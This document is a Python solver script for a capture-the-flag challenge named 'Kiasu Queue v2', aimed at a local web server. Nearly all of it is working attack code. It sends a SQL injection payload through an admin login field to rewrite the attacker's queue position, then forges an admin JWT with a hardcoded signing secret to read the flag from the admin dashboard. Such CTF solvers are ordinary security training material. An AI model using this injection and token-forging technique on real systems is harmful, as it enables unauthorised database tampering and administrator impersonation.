
#!/usr/bin/env python3
"""Demo solver for Kiasu Queue v2"""
import requests, jwt, re, uuid

BASE="http://localhost:8080"
s=requests.Session()
s.get(BASE)
uuid_cookie=s.cookies.get("user_uuid")
print("uuid:",uuid_cookie)

payload=f"';UPDATE queue_positions SET position=1 WHERE user_uuid='{uuid_cookie}'-- "
s.post(f"{BASE}/admin-kiasu-interface",data={"username":payload})
secret="kiasu_rs256_secr3t!@#"
token=jwt.encode({"user":"admin","uuid":uuid_cookie},secret,algorithm="HS256")
s.cookies.set("session",token,domain="localhost",path="/")
r=s.get(f"{BASE}/admin-dashboard")
print(re.search(r"flag\{[^}]+\}",r.text).group(0))
